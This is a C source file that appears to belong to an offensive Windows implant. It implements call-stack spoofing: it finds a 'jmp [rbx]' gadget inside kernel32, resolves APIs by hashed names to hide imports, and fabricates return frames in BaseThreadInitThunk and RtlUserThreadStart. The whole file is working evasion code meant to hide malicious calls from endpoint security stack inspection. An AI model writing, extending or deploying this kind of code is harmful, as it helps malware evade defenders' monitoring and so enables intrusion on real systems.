#include <stdint.h>

#include "api-hashing.h"
#include "trampoline.h"
#include "camouflage.h"

void *gadget_jmp_ptr_rbx = NULL;

void *find_jmp_ptr_rbx(void *base_addr, size_t size_limit)
{
  uint8_t *ptr = base_addr;
  for(size_t i = 0 ; i < size_limit ; i++)
  {
    uint16_t *ret = (void *)(ptr + i);
    if(*ret == 0x23FF)
    {
      return ret;
    }
  }
  return NULL;
}

void setup_camouflage(StackSpoofContext *ctx)
{
  PBYTE ReturnAddress;
  void *kernel32 = GetModuleHandleH(kernel32dll_MODDED_DJB2);
  DWORD cache;

  if(!gadget_jmp_ptr_rbx)
  {
    // Should be parsing the size of the .text section. But I am lazy.
    gadget_jmp_ptr_rbx = find_jmp_ptr_rbx(kernel32, 0x80000);
  }

  ctx->jmp_ptr_rbx_gadget_addr = gadget_jmp_ptr_rbx;

  ReturnAddress = (PBYTE)(GetProcAddressH(kernel32, BaseThreadInitThunk_MODDED_DJB2)) + 0x14; // Would walk export table but am lazy
  CalculateFunctionStackSizeWrapper(ReturnAddress, &(ctx->fake_frame_size_2));
  ctx->fake_ret_addr_2 = ReturnAddress;

  ReturnAddress = (PBYTE)(api_full_resolve64(RtlUserThreadStart_MODDED_DJB2_WITH_LIB)) + 0x21;
  CalculateFunctionStackSizeWrapper(ReturnAddress, &(ctx->fake_frame_size_3));
  ctx->fake_ret_addr_3 = ReturnAddress;

  CalculateFunctionStackSizeWrapper(ctx->jmp_ptr_rbx_gadget_addr, &(ctx->fake_frame_size_1));
}
